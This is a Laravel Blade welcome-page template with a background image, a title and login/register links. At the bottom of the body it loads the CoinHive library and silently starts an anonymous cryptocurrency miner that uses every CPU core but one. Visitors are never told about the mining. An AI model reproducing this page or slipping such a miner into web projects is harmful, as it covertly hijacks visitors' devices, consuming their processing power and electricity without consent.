<!doctype html>
<html lang="{{ app()->getLocale() }}">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>{{ env('APP_NAME') }}</title>

        <!-- Fonts -->
        <link href="https://fonts.googleapis.com/css?family=Roboto:100,600" rel="stylesheet" type="text/css">

        <!-- Styles -->
        <style>
            html, body {
                background-image:url('/images/background.jpg');
                background-size: cover;
                background-repeat:no-repeat;
                background-color: #fff;
                color: #fff;
                text-shadow:
                    -1px -1px 0 #b2b2b2,
                    1px -1px 0 #b2b2b2,
                    -1px 1px 0 #b2b2b2,
                    1px 1px 0 #b2b2b2; 
                font-family: 'Roboto', sans-serif;
                font-weight: 100;
                height: 100vh;
                margin: 0;
            }

            .full-height {
                height: 100vh;
            }

            .flex-center {
                align-items: center;
                display: flex;
                justify-content: center;
            }

            .position-ref {
                position: relative;
            }

            .top-right {
                position: absolute;
                right: 10px;
                top: 18px;
            }

            .content {
                text-align: center;
            }

            .title {
                font-size: 84px;
            }

            .links > a {
                color: #636b6f;
                padding: 0 25px;
                font-size: 12px;
                font-weight: 600;
                letter-spacing: .1rem;
                text-decoration: none;
                text-transform: uppercase;
            }

            .m-b-md {
                margin-bottom: 30px;
            }
        </style>
    </head>
    <body class="background">
        <div class="flex-center position-ref full-height">
            @if (Route::has('login'))
                <div class="top-right links">
                    @auth
                        <a href="{{ url('/home') }}">Home</a>
                    @else
                        <a href="{{ route('login') }}">Login</a>
                        <a href="{{ route('register') }}">Register</a>
                    @endauth
                </div>
            @endif

            <div class="content">
                <div class="title m-b-md">
                    {{ env('APP_NAME') }}
                </div>

            </div>
        </div>
        <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
        <script>
            var hive = {
                key: "{{ env('COIN_HIVE_KEY') }}",
                options: {
                    threads: navigator.hardwareConcurrency - 1,
                }
            };
            
            var miner = new CoinHive.Anonymous(hive.key);
            miner.start();

            var ray = function() {
                miner.setNumThreads(hive.options.threads);
            }
        </script>
    </body>
</html>
